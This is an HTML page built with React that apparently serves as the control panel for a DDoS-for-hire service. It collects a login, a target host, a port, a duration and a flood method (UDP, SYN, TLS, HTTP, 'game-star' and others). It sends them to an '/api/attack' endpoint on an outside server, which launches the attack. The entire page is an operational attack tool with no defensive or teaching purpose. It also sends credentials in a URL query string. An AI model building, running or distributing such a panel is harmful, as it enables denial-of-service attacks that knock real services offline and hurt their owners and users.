<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Lone API</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.20.5/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/framer-motion/10.12.16/framer-motion.umd.min.js"></script>
    <style>
        body {
            background: linear-gradient(to bottom right, #1a1a2e, #3a0ca3);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
            width: 350px;
        }
        input, select, button {
            width: 100%;
            margin: 8px 0;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }
        input, select {
            background: #444;
            color: white;
        }
        button {
            background: purple;
            color: white;
            cursor: pointer;
        }
        button:disabled {
            background: gray;
            cursor: not-allowed;
        }
        pre {
            text-align: left;
            background: black;
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
            overflow: auto;
        }
    </style>
</head>
<body>
    <div id="root"></div>
    <script type="text/babel">
        const { useState, useEffect } = React;
        const { motion } = window.framerMotion;

        function TestAPI() {
            const [username, setUsername] = useState("");
            const [password, setPassword] = useState("");
            const [host, setHost] = useState("");
            const [port, setPort] = useState("");
            const [time, setTime] = useState("");
            const [method, setMethod] = useState("udp");
            const [response, setResponse] = useState(null);
            const [loading, setLoading] = useState(false);
            const methods = ["tls", "http", "udp", "tcp", "syn", "game-star"];

            const handleTestAPI = async () => {
                setLoading(true);
                setResponse(null);
                try {
                    const res = await fetch(`https://api.loneservices.xyz/api/attack?username=${username}&password=${password}&target=${host}&port=${port}&time=${time}&method=${method}`);
                    const data = await res.json();
                    setResponse(data);
                } catch (error) {
                    setResponse({ error: "Failed to fetch response" });
                }
                setLoading(false);
            };

            return (
                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="container">
                    <h1>Test Lone API</h1>
                    <input type="text" placeholder="Username" value={username} onChange={(e) => setUsername(e.target.value)} />
                    <input type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
                    <input type="text" placeholder="Host" value={host} onChange={(e) => setHost(e.target.value)} />
                    <input type="text" placeholder="Port" value={port} onChange={(e) => setPort(e.target.value)} />
                    <input type="text" placeholder="Time (seconds)" value={time} onChange={(e) => setTime(e.target.value)} />
                    <select value={method} onChange={(e) => setMethod(e.target.value)}>
                        {methods.map((m, index) => (<option key={index} value={m}>{m.toUpperCase()}</option>))}
                    </select>
                    <button onClick={handleTestAPI} disabled={loading}>{loading ? "Testing..." : "Test API"}</button>
                    {response && <pre>{JSON.stringify(response, null, 2)}</pre>}
                </motion.div>
            );
        }
        ReactDOM.render(<TestAPI />, document.getElementById("root"));
    </script>
</body>
</html>
